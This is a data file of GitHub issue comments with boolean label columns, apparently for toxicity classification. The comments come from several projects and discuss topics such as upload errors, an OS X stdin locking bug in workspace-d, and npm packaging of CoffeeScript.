cerberus/NEU-Libraries/692/83737882,"Same result. p Patrick Yott Associate Dean for Digital Strategies and Services Northeastern University Libraries 360 Huntington Ave, SL 327 Boston, MA 02117 p.yott@friend.edu 617.373.4194 617.373.5409 (fax) From David Cliff notifications@friend.com&lt;mailtonotifications@friend.com&gt; Reply-To NEU-Libraries/cerberus reply@friend.github.com&lt;mailtoreply@friend.github.com&gt; Date Thursday, March 19, 2015 at 345 PM To NEU-Libraries/cerberus cerberus@friend.github.com&lt;mailtocerberus@friend.github.com&gt; Cc Patrick Yott p.yott@friend.edu&lt;mailtop.yott@friend.edu&gt; Subject Re [cerberus] 500 Error When Uploading Large(ish) Video (#692) Sure, I guess. - Reply to this email directly or view it on GitHub",False,True,False,cerberus/NEU-Libraries/692
ceph/ceph/12105/263315944,"@friend I spent some time experimenting with a switch statement like this but I ran into problems because libcurl will add a  header to these POST requests - and because  is part of the s3 signature, this breaks the authentication we only generate POST requests for  and , so I tried passing this header in explicitly - but it got pretty messy, and I'm not sure the refactoring is worth it at this point when the fix in this PR is so much simpler. what do you think? ",False,True,False,ceph/ceph/12105
cerberus/NEU-Libraries/692/63065884,"I just tried to load a 366 MB video file into the Library's media collection ( but got a 500 server error. Do we have  a max upload size set? If so, how large can it go? ",False,True,False,cerberus/NEU-Libraries/692
cerberus/NEU-Libraries/692/83735376,I can't see a 500 error in the logs. We don't have a max upload size that I'm aware of. ,False,True,False,cerberus/NEU-Libraries/692
cerberus/NEU-Libraries/692/83737213,"Will do.  If it loads I'll delete the lower resolution MP4 version. p Patrick Yott Associate Dean for Digital Strategies and Services Northeastern University Libraries 360 Huntington Ave, SL 327 Boston, MA 02117 p.yott@friend.edu 617.373.4194 617.373.5409 (fax) From David Cliff notifications@friend.com&lt;mailtonotifications@friend.com&gt; Reply-To NEU-Libraries/cerberus reply@friend.github.com&lt;mailtoreply@friend.github.com&gt; Date Thursday, March 19, 2015 at 345 PM To NEU-Libraries/cerberus cerberus@friend.github.com&lt;mailtocerberus@friend.github.com&gt; Cc Patrick Yott p.yott@friend.edu&lt;mailtop.yott@friend.edu&gt; Subject Re [cerberus] 500 Error When Uploading Large(ish) Video (#692) Sure, I guess. - Reply to this email directly or view it on GitHub",False,True,False,cerberus/NEU-Libraries/692
ceph/ceph/12105/263411857,"Also ran into this with civetweb when trying out multisite on master, will apply the patch and see if it works ",False,True,False,ceph/ceph/12105
cerberus/NEU-Libraries/692/83736377,"That was the reduced version that I was able to load.  The original file was the same name with the .mov extension. Should I try again? p Patrick Yott Associate Dean for Digital Strategies and Services Northeastern University Libraries 360 Huntington Ave, SL 327 Boston, MA 02117 p.yott@friend.edu 617.373.4194 617.373.5409 (fax) From David Cliff notifications@friend.com&lt;mailtonotifications@friend.com&gt; Reply-To NEU-Libraries/cerberus reply@friend.github.com&lt;mailtoreply@friend.github.com&gt; Date Thursday, March 19, 2015 at 343 PM To NEU-Libraries/cerberus cerberus@friend.github.com&lt;mailtocerberus@friend.github.com&gt; Cc Patrick Yott p.yott@friend.edu&lt;mailtop.yott@friend.edu&gt; Subject Re [cerberus] 500 Error When Uploading Large(ish) Video (#692) Can you remember the original filename of the file? Was it; Digital Media Commons - The Shape of Things to Come-JbpCUVRNYqc.mp4 ? - Reply to this email directly or view it on GitHub",False,True,False,cerberus/NEU-Libraries/692
ceph/ceph/12105/263549100,"After applying the patch can run multisite on master again, before this patch saw a few sync issues ",False,True,False,ceph/ceph/12105
ceph/ceph/12105/263700950,@friend updated to treat  as a GET request - still passing test_multi.py ,False,True,False,ceph/ceph/12105
cerberus/NEU-Libraries/692/83752738,the /tmp directory is running out of space - Ernesto is reorganizing spacing to fix the issue ,False,True,False,cerberus/NEU-Libraries/692
cerberus/NEU-Libraries/692/83849505,"Hmm, not sure. Have a chat with @friend - the issue lies with the amount of space we can give to a /tmp or /var/tmp or similar, which is a money/ITS thing I think. ",False,True,False,cerberus/NEU-Libraries/692
cerberus/NEU-Libraries/692/83738791,"Still nothing in the logs, and without further information, hard to determine what the issue is. I could try replicating it if you make the file available somewhere I suppose. ",False,True,False,cerberus/NEU-Libraries/692
ceph/ceph/12105/262036000,@friend thanks for the review - i changed it to set  for  and ,False,True,False,ceph/ceph/12105
cerberus/NEU-Libraries/692/83744343,"@friend  This is why we include screenshots!  It's an Apache 500, which means we need to alter the configuration to handle this arbitrarily large file. ",False,True,False,cerberus/NEU-Libraries/692
cerberus/NEU-Libraries/692/83851002,"Will do - stop working.  Good basketball on.. Patrick Yott Associate Dean for Digital Strategies and Services Northeastern University Libraries 360 Huntington Ave, SL 327 Boston, MA 02115 401.338.3787 p.yott@friend.edu From David Cliff notifications@friend.com&lt;mailtonotifications@friend.com&gt; Reply-To NEU-Libraries/cerberus reply@friend.github.com&lt;mailtoreply@friend.github.com&gt; Date Thursday, March 19, 2015 at 951 PM To NEU-Libraries/cerberus cerberus@friend.github.com&lt;mailtocerberus@friend.github.com&gt; Cc Patrick Yott p.yott@friend.edu&lt;mailtop.yott@friend.edu&gt; Subject Re [cerberus] 500 Error When Uploading Large(ish) Video (#692) Hmm, not sure. Have a chat with @friend - the issue lies with the amount of space we can give to a /tmp or /var/tmp or similar, which is a money/ITS thing I think. - Reply to this email directly or view it on GitHub",False,True,False,cerberus/NEU-Libraries/692
cerberus/NEU-Libraries/692/85144770,Avalon sets their max upload size to 250MB right now. This is set in the master_file model and then checked in the create method in the controller and returns an error if over that size. ,False,True,False,cerberus/NEU-Libraries/692
cerberus/NEU-Libraries/692/83770603,"What's the reasonable size limit?  I think we will start seeing lots of video requests! Thanks so much P Patrick Yott Associate Dean for Digital Strategies and Services Northeastern University Libraries 360 Huntington Ave, SL 327 Boston, MA 02115 617.373.4194 p.yott@friend.edumailtop.yott@friend.edu Sent from my iPhone On Mar 19, 2015, at 541 PM, David Cliff notifications@friend.com&lt;mailtonotifications@friend.com&gt; wrote Closed #692 via 061b46c to this email directly or view it on GitHub",False,True,False,cerberus/NEU-Libraries/692
charts/helm/404/200901874,"Changed default value for Kubernetes Cloud name (kubernetes-plugin has hardcoded value ""kubernetes""). Without this change each pod template needs to specify ""cloud"" parameter unless you manually set it to ""kubernetes"". See ",False,True,False,charts/helm/404
cerberus/NEU-Libraries/692/85146469,"Interesting.  I think we'll want ours larger as we are about to embark (I think) on converting some commercial VHS tapes in the collection. p Patrick Yott Associate Dean for Digital Strategies and Services Northeastern University Libraries 360 Huntington Ave, SL 327 Boston, MA 02117 p.yott@friend.edu 617.373.4194 617.373.5409 (fax) From Eli Zoller notifications@friend.com&lt;mailtonotifications@friend.com&gt; Reply-To NEU-Libraries/cerberus reply@friend.github.com&lt;mailtoreply@friend.github.com&gt; Date Monday, March 23, 2015 at 257 PM To NEU-Libraries/cerberus cerberus@friend.github.com&lt;mailtocerberus@friend.github.com&gt; Cc Patrick Yott p.yott@friend.edu&lt;mailtop.yott@friend.edu&gt; Subject Re [cerberus] 500 Error When Uploading Large(ish) Video (#692) Avalon sets their max upload size to 250MB right now. This is set in the master_file model and then checked in the create method in the controller and returns an error if over that size.  to this email directly or view it on GitHub",False,True,False,cerberus/NEU-Libraries/692
ci-phpunit-test/kenjis/151/191260781,"Plain vanilla install as per readme. I get If I put a  in at L117 of system/core/Log.php, sure enough, the entry is missing, even though it is declared in app/config/config.php.  In fact the only entry in $config is 'base_url'. Any ideas? Thanks ",False,True,False,ci-phpunit-test/kenjis/151
ci-phpunit-test/kenjis/151/262640438,No idea. Do you see the CI welcome page via your browaser (without the notice)? I can't reproduce the notice. Installation Running tests ,False,True,False,ci-phpunit-test/kenjis/151
ci-phpunit-test/kenjis/151/262650196,"I had a similar error, if i remind me right i think your config.php doesn't contain all config vars that CI3 needs. ",False,True,False,ci-phpunit-test/kenjis/151
classroom/education/1678/432752999,"Hey @friend, this is behavior is managed in GitHub.com and therefore we are not the best place report this to. The best you can do is contact GitHub support about this ",False,True,False,classroom/education/1678
classroom/education/1678/432795426,"Sorry but I must disagree, misbehavior comes not from github itself, but from interaction with classroom. It's blocking/limiting use of your classroom software. Yes it is on the borderline but just saying it's not your problem and closing issue is not constructive. ",False,True,False,classroom/education/1678
classroom/education/1678/373227578,"Describe the bug A teacher using classroom sees all the student repositories all the time in GitHub. Teaching is a specific activity, separate from ""normal"" github use.  These repositories and accounts should only be visible in github after specifically logging in through/doing a procedure from the ClassRoom interface, i.e. the place we sent the invitations to create private repos in the first place. At the minimum we need a global ""filter all ClassRoom related"" on personal setting of github profile or something, so teachers can also do research. I realize this is an interaction between how ClassRoom uses github to mascarade teaching into a git image. It is still a messy bug in the sense that I would need to open a second github account specifically for teaching at this stage, but I like my account. To Reproduce Steps to reproduce the behavior  Use github for normal github usage  develop open source Enroll into classroom Click on 'Send Assignment Link' to about 100+ students, 3 weeks in a row Add a github filter to your mailbox Connect to github, try to find any of your repositories in the ""repos"" search box. Admire the fact the bar is trailing off screen  Expected behavior These accounts/repositories should not be visible under github unless I explicitly am doing ""teaching/grading"", i.e. accessing github through ClassRoom provided links. Screenshots see attached  Additional context I have a lot of students. ",False,True,False,classroom/education/1678
cleopatra/devtools-html/18/185254217,"Add a column to the tree for icons, and for JS frames from http(s) URLs, show the domain's favicon. ",False,True,False,cleopatra/devtools-html/18
classroom/education/1678/432796979,"I feel I am not the one that has to setup collab with github services to get them to ackowledge problem, from my pov it comes from use of ClassRoom not github.You're all the same company, sort it out, or not and we look for service elsewhere. ",True,True,False,classroom/education/1678
classroom/education/1678/432802043,"@friend GitHub Classroom is built on the GitHub API, it does not alter the functionality of github.com. When you connect an organization to Classroom, we automatically create student repositories for you from your GitHub account. As such, all of the repositories will be visible from your GitHub account. While I understand why you might want this, it is not something that we can change. ",False,True,False,classroom/education/1678
coblocks/godaddy/485/430632847,This pull requests adds PHP_CodeSniffer functionality to the project through composer and resolves a number of warnings and errors surfaced by it. Running the Code Sniffer  Install Composer if you haven't already. Run  to install the sniffer and needed standards. Run  to check the project according to the rules defined in .  This addition utilizes the coding standards defined by the WordPress Coding Standards project. We're also using the coding standards defined by the PHPCompatibility project to ensure the PHP code is compatible with the stated requirement (current PHP 5.2.4+). This pull request fixes all issues surfaced while ignoring some specific rules for reasons of preference or where they don't actually apply to the context. You can find these ignored rules by looking for inline comments with  followed by the rule we're ignoring. The purpose of this is to help everyone follow the same coding standards as defined in the guidelines for contributing document. ,False,True,False,coblocks/godaddy/485
coblocks/godaddy/485/485218915,@friend conflicts have been resolved with the master branch. ,False,True,False,coblocks/godaddy/485
code-d/Pure-D/29/182505143,"Do you have some dependency in dub.sdl? workspace-d crashes when you depend on something that hasn't downloaded yet. Also it doesn't add the import paths for phobos, you should change those in the user settings. Thats very weird. Do all processes run while its open? At the bottom there should be 2 more buttons ""application"" and ""debug"" and the processes workspace-d and dcd-server should run ",False,True,False,code-d/Pure-D/29
coblocks/godaddy/485/493254711,"Hey @friend, we recently built a deployment process that checks for PHPCS (among other tests) so we're going to close this one. Thanks! ",False,True,False,coblocks/godaddy/485
code-d/Pure-D/29/182521380,Might have been this issue  updating workspaced &amp; code-d now ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/182586167,"ok not using tildes makes it find workspace-d again, even though the error in the first screenshot stays exactly the same also no i am not using any dependecies. just raw result of a  ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/182583633,"try replacing it with /home/USER/bin/workspace-d, it does not expand tildes ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/182586672,and yea no autocompletion ;) ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/182582997,I update workspace-d now and now i get  in visual studio code. my user settings are the log looks like ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/183003345,From the log it seems to work. Did you try pressing escape and then ctrl-space again a few times? ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/132747012,"i think i might have missed something while setting up but i cannot seem to get completion to work &lt;img width=""1226"" alt=""screen shot 2016-02-10 at 17 19 35"" src="" of the log seems as if everything is setup correctly though ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/183002952,"ok i used workspace-d-installer to create all current binaries and now the log shows more traffic but still no completion -.- &lt;img width=""941"" alt=""screen shot 2016-02-11 at 19 36 10"" src=""",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/182587964,Not sure if it happens because osx rejects something there. Can you clone this repository and try debugging the extension? Simply click debug and start at the right. Error paths should be better then ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/183007674,"hm the plugin definitely receives and parses the completion correctly. Also those logs are near the callback passing the arguments back so vscode should receive them correctly. It should be an issue with vscode, did you try closing the file at the top left and reopen it? ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/183013277,this is the weirdest thing here... now after restarting the log again says nothing... like this morning. are u in the #d irc ? ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/183710598,is another dcd-server already running? ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/183027932,caused from ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/190857741,"From #32, this is the .gif of the scenario  Basically, ""Loading..."" hangs indefinitely even when symbols are received from dcd-server. Sometimes, though, I get the box shown, but literally after 1 minute or more. I'm available for any help I can provide, maybe IRC? ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/191341836,Oh thank you for finding the reason. Im gonna fix it with Extrawurst on the IRC ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/191332354,"Hi guys, Code developer here. I just went deep in this with @friend and @friend, both devs in the Code team as well. We're closing the issue on our side, since we concluded that it must happen somewhere between workspace-d and the processes it manages. Here's what's happening your extension seems to resolve any language service request only once a second request comes along. The extension is always off by one. This explains why Intellisense doesn't work when ran consecutively the first request gets resolved when we are already expecting the second one. A quick proof of this trigger Intellisense and, while it says , hover over an identifier in the file. This will send another request to the extension (hover provider), thus completing the first one (completion items).  We verified this (and further that the fault doesn't seem to be workspace-d itself) by adding some code to append to a log file in source/app.d#24. If you do that you'll quickly realise that workspace-d itself doesn't write to stdout until the next request comes along. There is indeed some stream buffering happening between workspace-d and the processes it spawns, and it seems to happen only on OS X. We stopped investigating there. plus one Good luck! ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/193386152,"Basically the issue is right here  but i have no idea how to fix it. Also can somebody on OSX try it out? I just pulled that code out and it works on linux but idk if that will be enough to reproduce the problem. So if somebody on OSX could try the code out, would be nice ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/191920540,"@friend unfortunately your patched js file did not change a thing. but what i found out now is that when the ""loading"" tooltip appears i can click on it with the mouse and THEN it shows the content XD - WTF ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/193390668,It runs for me on OSX. I see the line . ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/193397333,"I have just pushed some synchronization stuff to workspace-d ~master. If you want to compile workspace-d and try it in code-d, it might possibly work now. But im not sure as i can't test it myself because I dont have access to any OS X thing ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/195632616,i just updated all binaries using workspace-d-installer and updated code-d and vscode and still the same behaviour / ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/193391860,Hm so its more than just the dcd.d class. Its a combination of both the DCD and the caller. Interesting. ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/198652156,@friend in your case workspace-d doesn't handle the request or code-d has problems sending/receiving it which is really strange. In the other cases workspace-d and code-d work but there are buffering issues ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223068629,any news with this? on osx is not usable ) ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/198585413,I think i have the same problem. Windows 7 x86.  Loading never ends. ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223745367,Well the issue is that every command is one command behind. The commands do work but always lag ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223069055,No idea. Did you try compiling workspace-d with LDC instead? ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223071081,"No idea when this will be solved, use some other plugin on OSX ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223070735,"Do you think is gonna be solved, should I wait or just use sublime or d-mono? ) ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223745339,"given the image above. the autocomplete sometimes works, but is very slow ) those are dlang settings ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223069834,"nop, I just use dcd and workspace-d install.d anyway, neither on irc, not a lot of people are using vscode with mac osx. On sublime is working properly. 👍 ) Is normal to make it work on osx I need to edit to files in extension itself?♠workspace-d.ts and package.json`? ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223071174,ok. thx ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/433501044,make a new issue with error logs ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223745422,I wish I could her here. Have no idea where to look ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223070280,No I think this issue is on the workspace-d site and has something to do with the OS buffering ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/433502543,I locked the issue because the code base has changed way too much since this issue was opened. Any issues now will not have anything to do with the issue that was experienced 2 years ago. It just only says  from vscode side because some component hangs or crashed when auto completing or hovering. As that can be a very wide spectrum of reasons I think it's better to create a new issue instead! Please make sure you include the logs as described in the template text when creating a new issue. If you don't want to create a new issue you can still join us on discord to get direct support and help from me and others ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/260703415,"Neat, thanks! Anyone on OSX wanna try it out now again with ~master workspace-d? Should be fixed now then. ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/410789883,"@friend make a new issue with error logs, you have 99% surely a different issue than this ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/223745303,"&lt;img width=""1280"" alt=""screen shot 2016-06-04 at 11 03 22 am"" src=""",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/261772647,Confirmed fixed using workspace-d ~master by @friend ,False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/238406860,"looks like this is fixed now, even though loading resolves takes ages sometimes ",False,True,False,code-d/Pure-D/29
code-d/Pure-D/29/410789384,"it's been two long years and still having this ""loading"" problem Cmon,it's a very simple looking bug that should have been fixed by now -1 -1 ",False,True,False,code-d/Pure-D/29
codechallenges/divinedragon/220/308216078,Codecov Report    Impacted Files Coverage Δ      src/main/java/codingbat/array1/P15_Double23.java      Continue to review full report at Codecov. ,False,True,False,codechallenges/divinedragon/220
code-d/Pure-D/29/433500576,Same issue here. Windows 8.1 VSCode 1.28.2 Not usable ,False,True,False,code-d/Pure-D/29
coffeescript/jashkenas/4056/127676659,"Nope, this should not be distributed with the npm package. If you want it, extract it from the appropriate github release. ",False,True,False,coffeescript/jashkenas/4056
code-d/Pure-D/29/260520668,"Hello. I've been able to track the issue. I've filed a bug report to the Phobos standard library  issue happens in the workspace-d process, basically, the main thread is acquired a lock the stdin to perform a read, and the getFD function invoked by spawnProcess is trying to lock stdin and this blocks the thread until the read in the main thread is fulfilled. I've done a simple workaround where I replace the global stdin for a File pointing to /dev/null. I am going to open a pull request in the workspace-d project and the community might judge if the solution is acceptable. Follows the diff diff --git a/source/app.d b/source/app.d index acf95cb..d5757e6 100644 --- a/source/app.d +++ b/source/app.d @@ -11,7 plus one1,17 @@ import std.exception;  import std.bitmanip;  import std.process;  import std.traits; -import std.stdio; +version (OSX) { +       import std.stdio  stdout, stderr, File; +       static import std.stdio; +       File stdin; +       static this() { +               stdin = std.stdio.stdin; +               std.stdio.stdin = File(""/dev/null"", ""r""); +       } +} else { +       import std.stdio; +}  import std.json;  import std.meta;  import std.conv;  ",False,True,False,code-d/Pure-D/29
coffeescript/jashkenas/4056/127719813,"Hey,thank you for your prompt reply. According to your use case, I think I am missing something. How do I import the client side version of coffeescript from the Npm package? ",False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127748988,You wouldn't. You can use bower to install CoffeeScript (including the browser build) or just fetch one of the release tarballs. npm distributes the files that are meant to be consumed by node when CoffeeScript is installed globally or as the dependency of a node project. ,False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127761537,"If you're using CS for browser code, then use browserify with coffeeify.  Making the user take the performance hit of local transpilation is probably a bad idea. ",False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127757146,"I disagree.Today npm modules are not only used for node project, but for frontend dependencies as well. See angular, jquery, hammerjs, moment, minim and so on. But I respect your position; that is why the fork button actually exists ;) ",False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127763480,"Hey,I am already using webpack with coffee-script loader, but I have a live editing part that should be transformed in the browser. Thanks anyway for the tip. ",False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127764767,"In that case...  You can point npm to the github address, and it will download master.  That should have what you need. ",False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127795420,I wonder if it makes sense to publish a separate entry in npm for just this one thing?  Just musing... ,False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127854948,npm is just not the right tool for the job here. Bower or cURL/tar are what you want. ,False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127769698,I am afraid it won't do the trick.  file still gets respected. Tested with npm install jashkenas/coffeescript#master npm install jashkenas/coffeescript#2d1a6fa6ec76b4e721da7e5e4a9c6b90172309ae ,False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/127888388,"Michael, are you sure of that? Personal experiences? Documentation? ",False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/128026116,"Yep, that article basically makes the point for me. They point out a bunch of the pain points of using npm for managing front-end dependencies and show how bower solves those better. Package managers are designed with specific contexts, use cases, and distribution models in mind. npm wanting to be the single package manager for all things JavaScript is laughable. ",False,True,False,coffeescript/jashkenas/4056
coffeescript/jashkenas/4056/128055985,"Ok, I see your point of view and I respect it. Thanks! ",False,True,False,coffeescript/jashkenas/4056
cookiecutter-pypackage/audreyr/280/193527488,"There's a new version of pytest available. You are currently using 2.9.2. I have updated it to 3.0.5 These links might come in handy  &lt;a href="" | &lt;a href="" | &lt;a href="" merge conflicts? Close this PR and delete the branch. I'll create a new PR for you. Happy merging! 🤖 ",False,True,False,cookiecutter-pypackage/audreyr/280
cookiecutter-pypackage/audreyr/280/274363189,Closing this in favor of #293 ,False,True,False,cookiecutter-pypackage/audreyr/280
cordova-plugin-purchase/j3k0/744/432093174,Duplicate; search before you open tickets. Thanks! Close #744 Von meinem iPhone gesendet ,False,True,False,cordova-plugin-purchase/j3k0/744
cordova-plugin-purchase/j3k0/744/432270748,"Let me give you the links and you tell me if it is solved 706 239 Open up and tell me if it is solved, thanks ",False,True,False,cordova-plugin-purchase/j3k0/744
cordova-plugin-purchase/j3k0/744/432269902,"Impressive! I searched all your issues and found 2 unresolved closed by inactivity. After a question, the admin decided not to answer but thanks so much it was very useful. If you could link the so called original of my question, please do Make sure you know how to answer before telling ppl to search before ",True,True,False,cordova-plugin-purchase/j3k0/744
cordova-plugin-purchase/j3k0/744/372737574,"[IOS] system info OSX Sierra 10.12.6 Cordova-ios@friend.5.5 // Ionic 3 Device iPhone iOS 11.2 Plugin Version 7.2.0 Expected behavior Product retrieved from store according to what has been set up Observed behavior Trying to purchase unknown product Steps to reproduce I created the Product on Itunes Connect. Added the product id to my code. First step is to register the product with the correct product id Set up approved, registered, updated, cancelled and error handlers Refresh store. call Get with correct product ID call Order with correct product ID the XCode Logs are Loaded{""id""""productID,""alias""""productID"",""type""""consumable"",""state""""requested"",""title""null,""description""null,""priceMicros""null,""price""null,""currency""null,""countryCode""null,""loaded""true,""canPurchase""false,""owned""false,""downloading""false,""downloaded""false,""additionalData""null,""transaction""null,""valid""true} 2018-10-22 200556.546938-0300 NFContacts[1444477718] [store.js] DEBUG store.queries !! 'consumable updated' 2018-10-22 200556.546974-0300 NFContacts[1444477718] [store.js] DEBUG store.queries !! 'valid updated' 2018-10-22 200556.547019-0300 NFContacts[1444477718] [store.js] DEBUG store.queries !! 'updated' 2018-10-22 200556.550326-0300 NFContacts[1444477718] [store.js] ERROR ios -&gt; ERROR 6777003 Trying to purchase a unknown product. - ""ProductID"" I have read two issues from this plugin with no solution on this. Please help ",False,True,False,cordova-plugin-purchase/j3k0/744
cordova-plugin-purchase/j3k0/744/432370337,"Please be fair, all you wrote is that it not work. But you not described what you already have done so far. So please tell if you have add the app to the AppStore as beta already or you only add your items. All details you can tell us may help! And without we can help you not! Von meinem iPhone gesendet ",False,True,False,cordova-plugin-purchase/j3k0/744
cordova-plugin-purchase/j3k0/744/432634191,"Hi, If you needed more details then you could have just said it. Im sorry for the missing information. The application has been approved by apple and also the product. I tried as much as I could before asking for help here Thanks for the consideration ",False,True,False,cordova-plugin-purchase/j3k0/744
cordova-plugin-purchase/j3k0/744/432518365,"@friend We don't work for you, so if you like us to give you support for free, on our free time, you'd better not talk this way. That's not how you'll get help. There's a F.A.Q. on the wiki with this checklist.  Have you enabled In-App Purchases for your App ID? Do you have a iTunes Paid Application contract in effect? Have you checked Cleared for Sale for your product? Are there any contracts waiting for approval? In-App Purchases have all fields filled (including screenshots)? Did you wait 24 hours? Using a real device (not a simulator)? Are you using the full product ID in register? Are there any error in your product ID? Do you wait cordova's ""deviceready"" event before loading the purchases? Have you submitted (and optionally rejected) your application binary? Does your project’s .plist Bundle ID match your App ID? Have you generated and installed a new provisioning profile for the new App ID? Have you configured your project to code sign using this new provisioning profile? Are your bank details active on iTunes Connect? Have you tried deleting the app from your device and reinstalling? Is your device jailbroken? If so, you need to revert the jailbreak for IAP to work.  Did you went over it? ",False,True,False,cordova-plugin-purchase/j3k0/744
cou-issues/ChildrenOfUr/1352/169816979,"Lost On Land Again I just hoed, watered and planted.  Went to the next street for a minute. Came back and nothing I had done was there.  The garden looked like it did when I first arrived. User Agent Log ",False,True,False,cou-issues/ChildrenOfUr/1352
cornice/Cornices/327/96160898,Schema level validators are not called during request validation.  In the example bellow the  function is never called.  This pull request fixes that. ,False,True,False,cornice/Cornices/327
cordova-plugin-purchase/j3k0/744/432635158,"@friend If you plan to keep a support team, do support developers. If you do not want to support and have answers like ""search before you open tickets. Thanks!"" then tell people on your front page that you do not have support. thank god you do not work for me. any ways I don't often open issues as my team tries very hard before asking for outside help so I am not here to be offended. The team decided to remove your plugin and pay extra for the time on developing with other resources. Hope you do not use this as a ""Duplicate"" for the next person who asks about this error. Wish you success, thanks ",False,True,False,cordova-plugin-purchase/j3k0/744
couchdb/apache/1269/312559863,"We've had multiple discussions on the mailing lists and IRC previously about this problem right now, you need to recompile CouchDB from scratch if you want to add search (dreyfus) or geo (hastings) support. This isn't great, and makes things like Docker images that include references to those things unwieldy (since you can't just add another layer on top of the existing  image.) @friend you said you had some specific ideas here, can you elaborate in this issue? Thanks! ",False,True,False,couchdb/apache/1269
cou-issues/ChildrenOfUr/1352/238244701,The server may not have persisted the entity changes to the database #1093 ,False,True,False,cou-issues/ChildrenOfUr/1352
couchdb/apache/1269/391312155,@friend any news on this? ,False,True,False,couchdb/apache/1269
cordova-plugin-purchase/j3k0/744/432641331,"I deleted the ""flame"" comments. They won't help anyone. I kept the rest of the conversation just in case it pops up again. ",False,True,False,cordova-plugin-purchase/j3k0/744
couchdb/apache/1269/412608218,"From the merged #1516 Once #1515 is done, this should be easy. @friend @friend ",False,True,False,couchdb/apache/1269
couchdb/apache/1269/475177957,Any more updates on this? It would be so wonderful not to be reliant on IBM! They can't even seem to handle billing 🤦🏻‍♂️ ,False,True,False,couchdb/apache/1269
courseplay/Courseplay/3219/409562677,"Course will not "" Drive""...then weird artifacting and then you must close game from desktop as all commands are frozen. ",False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463005046,"same for myself as well, same version ",False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463017291,cannot use the programme since updating it my player just freezes inside the cab and nothing works i have to exit the game............... ,False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463030814,It's not v.00064 - it's the version labelled 'Trigger Stuff' or later (.0065). If you revert to v.00064 with commit 70cee76 - that is working normally (,False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463038807,So many complaints but not a single log posted... ,False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463039211,It most definitely was version 64 ,False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463039390,"No, it's the trigger stuff. ",False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463040558,I guess that you didn't like that it was version 64 ,False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463041522,"I guess I don't like that you have no friggin idea what you are talking about.  For those who know, it was 229322b00717a4c75f8425923ec4ed948e2142b5 causing the issue. ",True,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3219/463169779,duplicate of #3221 ,False,True,False,courseplay/Courseplay/3219
courseplay/Courseplay/3234/410508899,  Inbox x          There is NO forward/backwards along line of travel adjustment for the cutter position on combine harvesters as indicated by original issue report.  It does not exist in any button in any way.   This results in all combine harvesters charging right into the crop.   This behavior occurred originally in FS17 courseplay and was fixed in FS17 courseplay. ,False,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3234/463821912,"This has to be the most unconstructive issue post on here, I have ever seen ( 👎 ",True,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3234/463830664,"@friend I may be misunderstanding the title of this issue, can you explain in more detail what exactly are you trying to say with  ""Mod team cannot read english submissions""? ",False,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3234/463893037,The CP folks are THE last group of modders that I'd want to piss off. I won't play FS without CP. I suggest you clarify whatever issue you might be having. ,False,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3234/463912310,I think he mentioned #3142 doing this in this way is a pure disgrace ... ,False,True,False,courseplay/Courseplay/3234
